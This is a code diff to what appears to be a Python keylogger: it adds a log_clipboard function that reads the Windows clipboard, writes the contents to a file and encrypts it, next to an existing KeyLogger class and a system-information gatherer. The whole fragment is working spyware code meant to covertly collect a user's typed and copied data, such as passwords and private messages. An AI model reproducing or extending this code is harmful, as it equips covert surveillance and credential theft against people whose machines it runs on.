@@ -126,6 +126,17 @@ def gather_system_information(file_name, key):
     except Exception as e:
         print(f"Error gathering system information: {e}")
 
+def log_clipboard(file_name, key):
+    try:
+        with open(file_name, "w") as f:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            f.write("Clipboard Data: \n" + pasted_data)
+        encrypt_file(file_name, key)
+    except Exception as e:
+        print(f"Error logging clipboard data: {e}")
+
 class KeyLogger:
     def __init__(self, log_file, key):
         self.log_file = log_file
